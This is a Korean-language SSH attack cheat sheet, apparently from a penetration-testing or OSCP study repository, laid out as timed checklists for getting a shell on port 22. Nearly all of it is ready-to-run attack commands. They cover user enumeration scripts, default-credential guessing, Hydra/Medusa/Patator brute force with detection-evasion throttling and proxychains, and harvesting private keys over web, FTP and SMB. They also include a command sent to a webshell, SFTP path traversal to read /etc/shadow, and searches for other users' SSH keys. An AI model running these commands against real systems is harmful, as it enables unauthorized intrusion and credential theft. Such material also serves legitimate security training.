# 🔐 SSH ATTACKS (Port 22)

> **목표: SSH 서비스 발견 후 15-25분 내에 쉘 접근 권한 확보**

## ⚡ 즉시 실행할 명령어들

### 🚀 SSH 발견 즉시 실행

```bash
# 1. SSH 버전 및 배너 확인
nmap -sV -p 22 {IP}
nc -nv {IP} 22
ssh {IP}

# 2. SSH 관련 NSE 스크립트 실행
nmap --script ssh-* -p 22 {IP}

# 3. 취약점 스캔
nmap --script ssh-vuln-* -p 22 {IP}
nmap --script ssh-auth-methods -p 22 {IP}

# 4. 알고리즘 및 키 교환 확인
nmap --script ssh2-enum-algos -p 22 {IP}
nmap --script ssh-hostkey -p 22 {IP}

# 5. 기본 자격증명 빠른 시도
ssh root@{IP}
ssh admin@{IP}
ssh user@{IP}
ssh {IP} -l root
```

### ⚡ 사용자 열거 (OpenSSH < 7.7)

```bash
# 사용자 열거 취약점 확인
nmap --script ssh-enum-users --script-args userdb=/usr/share/wordlists/metasploit/unix_users.txt -p 22 {IP}

# 수동 사용자 열거
python3 ssh_user_enum.py {IP} -U /usr/share/wordlists/metasploit/unix_users.txt

# 타이밍 기반 사용자 열거
for user in $(cat users.txt); do
  echo "Testing $user"
  timeout 5 ssh $user@{IP} 2>&1 | grep -E "(Permission denied|password:)"
done
```

---

## 📋 단계별 체크리스트

### 🎯 Phase 1: 발견 및 기본 정보 수집 (5분)

- [ ] **SSH 포트 확인** `nmap -p 22 {IP}`
- [ ] **SSH 버전 확인** `nmap -sV -p 22 {IP}`
- [ ] **배너 정보 수집** `nc -nv {IP} 22`
- [ ] **지원하는 인증 방법 확인** `nmap --script ssh-auth-methods {IP}`
- [ ] **호스트 키 정보 확인** `nmap --script ssh-hostkey {IP}`

### 🔍 Phase 2: 취약점 및 정보 열거 (5분)

- [ ] **SSH 취약점 스캔** `nmap --script ssh-vuln-* {IP}`
- [ ] **암호화 알고리즘 확인** `nmap --script ssh2-enum-algos {IP}`
- [ ] **사용자 열거 시도** (OpenSSH < 7.7인 경우)
- [ ] **약한 키 확인** `nmap --script ssh-hostkey {IP}`
- [ ] **SSH 설정 정보 수집**

### 🔓 Phase 3: 인증 우회 시도 (10분)

- [ ] **기본 자격증명 시도** (root/root, admin/admin 등)
- [ ] **사용자명 기반 패스워드 시도** (user/user, admin/password)
- [ ] **SSH 키 파일 시도** (다른 서비스에서 수집한 키)
- [ ] **브루트포스 공격 시작** (백그라운드)
- [ ] **패스워드 없는 키 시도**

### 💥 Phase 4: 고급 공격 (5분)

- [ ] **SSH 터널링 가능성 확인**
- [ ] **포트 포워딩 테스트**
- [ ] **에이전트 포워딩 확인**
- [ ] **X11 포워딩 테스트**
- [ ] **다른 서비스와 연계 공격**

---

## 🎯 상황별 대응

### 🔓 기본 자격증명 시도

```bash
# 일반적인 기본 자격증명
ssh root@{IP}
# 패스워드 시도: root, toor, password, admin, 123456

ssh admin@{IP}
# 패스워드 시도: admin, password, administrator, admin123

ssh user@{IP}
# 패스워드 시도: user, password, user123, 123456

ssh test@{IP}
# 패스워드 시도: test, password, test123

# 서비스별 기본 계정
ssh oracle@{IP}        # Oracle 관련
ssh postgres@{IP}      # PostgreSQL
ssh mysql@{IP}         # MySQL
ssh apache@{IP}        # Apache
ssh www-data@{IP}      # Web server
ssh ftp@{IP}           # FTP 관련

# 빈 패스워드 시도
ssh root@{IP} -o PasswordAuthentication=no -o PubkeyAuthentication=no
```

### 🗝️ SSH 키 기반 공격

```bash
# 다른 서비스에서 발견한 SSH 키 사용
chmod 600 id_rsa
ssh -i id_rsa root@{IP}
ssh -i id_rsa user@{IP}
ssh -i id_rsa admin@{IP}

# 일반적인 SSH 키 위치에서 키 시도 (다른 서비스에서 다운로드한 경우)
ssh -i /home/user/.ssh/id_rsa user@{IP}
ssh -i /root/.ssh/id_rsa root@{IP}

# 키 파일 권한 설정
chmod 600 ~/.ssh/id_rsa
chmod 600 ~/.ssh/id_dsa
chmod 600 ~/.ssh/id_ecdsa
chmod 600 ~/.ssh/id_ed25519

# 패스프레이즈 없는 키 파일 생성 (테스트용)
ssh-keygen -t rsa -f test_key -N ""
ssh -i test_key user@{IP}

# 알려진 약한 키 시도
wget https://github.com/offensive-security/exploitdb/raw/master/docs/english/44064-debian-openssl-predictable-prng-cve-2008-0166.txt
# 약한 키들을 이용한 접속 시도
```

### 💥 브루트포스 공격

```bash
# Hydra를 이용한 브루트포스
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{IP}
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{IP}
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://{IP}

# 사용자 리스트와 패스워드 리스트 조합
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://{IP}

# 속도 조절 (너무 빠르면 차단될 수 있음)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{IP} -t 4 -W 3

# Medusa 사용
medusa -h {IP} -u root -P /usr/share/wordlists/rockyou.txt -M ssh
medusa -h {IP} -U users.txt -P passwords.txt -M ssh

# Nmap 브루트포스
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt -p 22 {IP}

# Patator 사용 (더 정교한 제어)
patator ssh_login host={IP} user=root password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed'
```

### 🔍 사용자 열거 (OpenSSH < 7.7)

```bash
# CVE-2016-6210 사용자 열거
python3 ssh_user_enum.py {IP} -U /usr/share/wordlists/metasploit/unix_users.txt

# 수동 사용자 열거 (타이밍 기반)
#!/bin/bash
for user in root admin user test guest oracle mysql postgres apache; do
    echo "Testing user: $user"
    time ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no $user@{IP} 2>&1 | head -1
done

# SSH 사용자 열거 스크립트 (세밀한 제어)
#!/bin/bash
users="root admin user test guest mysql postgres oracle apache www-data nobody daemon bin sys sync games man lp mail news uucp proxy www-data backup list irc gnats"
for user in $users; do
    timeout 5 ssh -o ConnectTimeout=3 -o PreferredAuthentications=none $user@{IP} 2>&1 | grep -E "(Permission denied|password:)"
done
```

### 🔧 SSH 터널링 및 포트 포워딩

```bash
# 로컬 포트 포워딩 (SSH 접근 성공 후)
ssh -L 8080:127.0.0.1:80 user@{IP}
ssh -L 3306:127.0.0.1:3306 user@{IP}  # MySQL 터널링
ssh -L 5432:127.0.0.1:5432 user@{IP}  # PostgreSQL 터널링

# 원격 포트 포워딩
ssh -R 4444:127.0.0.1:4444 user@{IP}  # 리버스 쉘용

# 동적 포트 포워딩 (SOCKS 프록시)
ssh -D 1080 user@{IP}

# SSH 터널을 통한 내부 네트워크 스캔
ssh user@{IP} -L 8080:192.168.1.1:80
# 그 후 localhost:8080으로 내부 서버 접근

# X11 포워딩 (GUI 애플리케이션)
ssh -X user@{IP}
ssh -Y user@{IP}  # 신뢰된 X11 포워딩
```

### 🗂️ SSH 설정 파일 악용

```bash
# SSH 접근 성공 후 설정 확인
cat /etc/ssh/sshd_config
cat ~/.ssh/config
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts

# 중요 설정 확인사항
grep -i "PermitRootLogin" /etc/ssh/sshd_config
grep -i "PasswordAuthentication" /etc/ssh/sshd_config
grep -i "PubkeyAuthentication" /etc/ssh/sshd_config
grep -i "PermitEmptyPasswords" /etc/ssh/sshd_config

# SSH 키 파일들 확인
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/authorized_keys

# 다른 사용자의 SSH 키 확인
find /home -name ".ssh" -type d 2>/dev/null
find /home -name "id_rsa" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null
```

---

## 🚨 문제 해결

### 🚫 연결 거부시

```bash
# 다른 SSH 포트 확인
nmap -p 22,222,2222,22222 {IP}

# 특정 포트로 SSH 연결
ssh -p 2222 user@{IP}

# SSH 서비스 상태 확인
nmap -sV -p 22 {IP}
nc -zv {IP} 22

# 방화벽 우회 시도
ssh -o ConnectTimeout=10 user@{IP}
```

### 🔐 인증 실패가 계속될 때

```bash
# 다른 인증 방법 시도
ssh -o PreferredAuthentications=password user@{IP}
ssh -o PreferredAuthentications=publickey user@{IP}
ssh -o PreferredAuthentications=keyboard-interactive user@{IP}

# verbose 모드로 연결 문제 진단
ssh -v user@{IP}
ssh -vv user@{IP}
ssh -vvv user@{IP}

# 다른 클라이언트 시도
telnet {IP} 22
nc -nv {IP} 22
```

### ⏰ 브루트포스 속도 조절

```bash
# 느린 브루트포스 (탐지 회피)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{IP} -t 1 -W 5

# 연결 제한 회피
hydra -l root -P passwords.txt ssh://{IP} -f -V -t 4 -w 30

# IP 변경하며 브루트포스 (프록시 체인)
proxychains hydra -l root -P passwords.txt ssh://{IP}
```

### 🔍 정보 부족시

```bash
# SSH 배너에서 더 많은 정보 추출
nc -nv {IP} 22 | head -1

# SSH 클라이언트 정보 확인
ssh -V

# 서버측 SSH 버전 상세 확인
nmap --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos -p 22 {IP}

# SSH 로그 확인 (접근 성공 후)
tail -f /var/log/auth.log
tail -f /var/log/secure
```

### 🔧 키 파일 문제 해결

```bash
# 키 파일 권한 수정
chmod 600 ~/.ssh/id_rsa
chmod 700 ~/.ssh/

# 키 파일 소유자 변경
chown $USER:$USER ~/.ssh/id_rsa

# 키 파일 형식 확인
file id_rsa
head -1 id_rsa

# 다른 형식의 키 변환
ssh-keygen -p -m PEM -f id_rsa
openssl rsa -in id_rsa -out id_rsa_converted
```

---

## 🔗 다른 서비스와 연계

### 🌐 웹 서비스와 연계

```bash
# 웹서비스에서 SSH 키 다운로드 후 사용
wget http://{IP}/backup/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa user@{IP}

# 웹쉘을 통해 SSH 키 생성
echo 'ssh-keygen -t rsa -f /tmp/key -N ""' | curl -X POST --data-binary @- http://{IP}/shell.php
```

### 📁 FTP와 연계

```bash
# FTP에서 SSH 키 다운로드
ftp {IP}
get /home/user/.ssh/id_rsa
quit
chmod 600 id_rsa
ssh -i id_rsa user@{IP}

# FTP에서 SSH 설정 파일 확인
get /etc/ssh/sshd_config
```

### 🗂️ SMB와 연계

```bash
# SMB에서 SSH 관련 파일 확인
smbclient //{IP}/home$ -N
get user/.ssh/id_rsa
get user/.ssh/authorized_keys

# SMB에서 얻은 크레덴셜로 SSH 접근
ssh domain\\user@{IP}
```

### 🗄️ 데이터베이스와 연계

```bash
# 데이터베이스에서 SSH 크레덴셜 확인
mysql -h {IP} -u root -p
SELECT * FROM users WHERE username LIKE '%ssh%';

# SSH를 통한 데이터베이스 터널링
ssh -L 3306:localhost:3306 user@{IP}
mysql -h localhost -P 3306 -u root -p
```

---

## 🎯 SSH 취약점별 공격

### 🐛 OpenSSH 7.4 - Username Enumeration

```bash
# CVE-2016-6210 사용자 열거
python ssh_user_enum.py {IP} -U users.txt

# 타이밍 공격 스크립트
#!/bin/bash
for user in $(cat users.txt); do
    time_start=$(date +%s%N)
    timeout 5 ssh $user@{IP} 2>/dev/null
    time_end=$(date +%s%N)
    echo "$user: $((($time_end - $time_start)/1000000)) ms"
done
```

### 🔓 OpenSSH < 6.2 - SFTP Path Traversal

```bash
# CVE-2010-4755 경로 순회
sftp user@{IP}
get ../../../etc/passwd
get ../../../../etc/shadow
```

### 💥 SSH 1.x Protocol Vulnerabilities

```bash
# SSH 1.x 프로토콜 지원 확인
nmap --script ssh-proto-version -p 22 {IP}

# CRC32 공격 (SSH 1.5)
# 자동화된 도구 필요
```

---

## ⏱️ 시간 관리 가이드

### 🎯 5분 안에 완료할 것들

- [ ] SSH 버전 및 기본 정보 수집
- [ ] 기본 자격증명 시도 (root/root, admin/admin)
- [ ] 사용자 열거 확인 (OpenSSH < 7.7인 경우)
- [ ] NSE 스크립트 실행

### 🔍 15분 안에 완료할 것들

- [ ] 모든 기본 자격증명 시도 완료
- [ ] SSH 키 파일 시도 (다른 서비스에서 수집한 것)
- [ ] 브루트포스 공격 시작 (백그라운드)
- [ ] SSH 취약점 스캔 완료

### 💥 25분 후 판단 기준

**성공 기준:**

- [ ] SSH 접근 성공
- [ ] 사용자 계정 식별 완료
- [ ] 터널링 가능성 확인
- [ ] 다른 서비스 접근 경로 확보

**실패시 다음 단계:**

- [ ] 브루트포스를 백그라운드로 계속 실행
- [ ] 다른 포트/서비스로 이동
- [ ] 수집한 정보로 다른 공격 벡터 시도
- [ ] SSH 터널링이 가능한 상황이면 우선순위 유지

**다음 단계**:

- 성공시 권한상승을 위해 `PRIVILEGE-ESCALATION/` 폴더로
- 실패시 다른 `PORT-ATTACKS/` 파일로 이동
- SSH 터널링 필요시 해당 섹션 참조
